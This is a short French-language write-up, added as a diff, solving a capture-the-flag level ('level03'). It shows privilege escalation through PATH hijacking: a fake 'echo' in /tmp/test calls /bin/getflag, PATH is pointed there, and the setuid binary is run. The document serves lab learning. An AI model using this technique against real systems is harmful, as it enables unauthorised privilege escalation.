@@ -1,0 +1,18 @@
+dans la VM:
+`strings` level03
+on voit que "Exploit me" est afficher avec `echo`
+-> modifier `echo` pour afficher le getflag car l'executable a les droits de son proprietaire
+
+dans /tmp/test:
+vim echo
+-> /bin/getflag
+
+faire un backup de la variable d'env PATH:
+export OLDPATH=$PATH
+
+changer la variable d'env pour trouver la nouvelle commande echo
+export PATH=/tmp/test
+
+executer ./level03
+
+su level04
